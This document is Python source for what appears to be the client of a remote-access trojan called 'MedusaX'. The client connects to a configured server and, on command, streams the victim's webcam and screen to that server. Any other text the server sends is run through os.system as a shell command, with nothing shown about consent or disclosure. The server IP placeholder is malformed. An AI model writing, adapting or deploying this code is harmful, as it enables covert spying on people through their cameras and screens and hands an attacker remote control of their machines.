import socket
import cv2
import pyautogui
import mss
import threading
import time
import os

# Global Variables
server_ip = '10.01.33'  # Example, replace with the server's IP address
server_port = 9999
streaming_active = False
client_socket = None

# Function to capture webcam feed and send to server
def webcam_stream():
    global streaming_active

    # Start webcam capture
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        print("[!] Unable to access webcam")
        return

    print("[*] Starting webcam stream...")
    while streaming_active:
        ret, frame = cap.read()
        if ret:
            # Compress frame to reduce size
            _, buffer = cv2.imencode('.jpg', frame)
            data = buffer.tobytes()

            # Send the frame data to server
            client_socket.sendall(data)
        time.sleep(0.1)  # Adjust to control stream speed
    cap.release()

# Function to capture screen and send to server
def screen_stream():
    global streaming_active

    # Start screen capture
    with mss.mss() as sct:
        print("[*] Starting screen stream...")
        while streaming_active:
            monitor = sct.monitors[1]  # Capture the first monitor
            img = sct.grab(monitor)
            img = mss.tools.to_png(img.rgb, img.size)

            # Send the screen data to server
            client_socket.sendall(img)
            time.sleep(0.1)  # Adjust to control stream speed

# Function to handle server commands
def handle_commands():
    global streaming_active
    while True:
        command = client_socket.recv(1024).decode('utf-8')

        if command.startswith('!webcam_stream'):
            if not streaming_active:
                streaming_active = True
                threading.Thread(target=webcam_stream).start()
            else:
                print("[*] Webcam stream is already active.")
        elif command.startswith('!screen_stream'):
            if not streaming_active:
                streaming_active = True
                threading.Thread(target=screen_stream).start()
            else:
                print("[*] Screen stream is already active.")
        elif command.startswith('CTRL+P'):
            print("[*] Stopping stream...")
            streaming_active = False
            break
        elif command.startswith("!"):
            print("[!] Unknown command.")
        else:
            os.system(command)  # Execute shell command if not valid MedusaX command

# Function to connect to the server
def connect_to_server():
    global client_socket

    # Create socket and connect to server
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((server_ip, server_port))
    print("[*] Connected to MedusaX server.")
    
    # Start listening for commands
    handle_commands()

# Start client connection and command handling
if __name__ == "__main__":
    connect_to_server()
